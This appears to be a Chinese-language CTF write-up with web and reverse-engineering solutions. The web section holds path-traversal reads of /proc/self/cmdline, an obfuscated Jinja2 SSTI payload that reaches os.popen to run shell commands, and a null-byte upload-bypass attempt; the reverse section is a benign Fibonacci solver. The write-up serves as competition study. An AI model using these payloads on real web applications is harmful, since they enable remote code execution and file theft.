# web
### On1y0ne
?file=/app/app.py
?file=/proc/self/cmdline
伪造cookie,上传文件,
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230716110307.png)

?file=/tmp/a.txt

### 无中生有
#SSTI 
```php
{%print(config|attr('%25c%25c%25c%25c%25c%25c%25c%25c%25c'|format(95,95,99,108,97,115,115,95,95,))|attr('%25c%25c%25c%25c%25c%25c%25c%25c'|format(95,95,105,110,105,116,95,95,))|attr('%25c%25c%25c%25c%25c%25c%25c%25c%25c%25c%25c'|format(95,95,103,108,111,98,97,108,115,95,95,))|attr('%25c%25c%25c%25c%25c%25c%25c%25c%25c%25c%25c'|format(95,95,103,101,116,105,116,101,109,95,95,))('o'~'s')|attr('pop'~'en')('cat%09app?py')|attr('read')())%}
```

直接读取galf,一开始没注意,还读了半天的pyc然后反编译...

### 不知所措
```php
<?php
    header("Location: /index.php");
    $file = $_FILES['file'];
    if(!$file){
        exit("请勿上传空文件");
    }
    $dir = "upload/";
    $name = $_FILES['file']['name'];
    $tmp = $_FILES['file']['tmp_name'];
    $ext = substr(strrchr($name, '.'), 0);
    if(preg_match('/p|h|s|[0-9]/i',$ext)){
        $ext = ".jpg";
        $name = time().$ext;
    }
    $path = $dir.$name;
    move_uploaded_file($tmp, $path);
?>
```
存在00截断漏洞,但是00也会影响后缀名的判断??
`a.php%00.jpg`
后缀名还是会变为jpg

---
# reverse

### Window
异或一下俩字符即可

### time
分析算法可知是要求一个递归数列的第n项斐波那契数列,拷打gpt给了一个快速矩阵求余算法
```python
string='abcdef0987654321+/'
def matrix_pow_mod(A, n, mod):
    res = [[1, 0], [0, 1]]  # 初始化为单位矩阵

    while n > 0:
        if n % 2 == 1:
            res = matrix_multiply_mod(res, A, mod)
        A = matrix_multiply_mod(A, A, mod)
        n //= 2

    return res

def matrix_multiply_mod(A, B, mod):
    C = [[0, 0], [0, 0]]

    for i in range(2):
        for j in range(2):
            for k in range(2):
                C[i][j] = (C[i][j] + A[i][k] * B[k][j]) % mod

    return C

def fibonacci_mod(n, mod):
    if n == 0:
        return 0

    A = [[1, 1], [1, 0]]
    res = matrix_pow_mod(A, n-1, mod)

    return res[0][0] % mod

# def which(n):
#     dp=[0]*(n+1)
#     dp[0]=1
#     if(n==0):
#         return 1
#     dp[1]=6
#     for i in range(2,n+1):
#         dp[i]=i+4*dp[i-1]+1
#     return dp[n]
if __name__ == '__main__':
    which=[1 ,6 ,27 ,112 ,453 ,1818 ,7279 ,29124 ,116505 ,466030 ,1864131 ,7456536 ,29826157 ,119304642 ,477218583 ,1908874348 ,7635497409 ,30541989654 ,122167958635 ,488671834560 ,1954687338261 ,7818749353066 ,31274997412287 ,125099989649172 ,500399958596713 ,2001599834386878 ,8006399337547539 ,32025597350190184 ,128102389400760765 ,512409557603043090 ,2049638230412172391 ,8198552921648689596]
    for i in range(32):
        print(string[(fibonacci_mod(which[i]+2,17))],end='')
```

# pwn

# crypto

# Misc


---
# *相关wp*




2023-07-16   11:02